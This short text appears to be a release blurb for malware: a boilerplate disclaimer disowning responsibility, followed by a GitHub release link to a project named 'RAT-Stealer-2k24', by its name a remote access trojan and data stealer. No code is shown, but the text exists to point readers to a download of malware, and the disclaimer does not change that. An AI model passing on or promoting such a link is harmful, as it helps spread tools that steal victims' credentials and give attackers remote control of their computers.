DO NOT USE FOR EVIL PURPOSES!
I DO NOT TAKE ANY RESPONSE FOR WHAT HAPPENS!                https://github.com/DEVpy2k21/RAT-Stealer-2k24/releases/tag/rat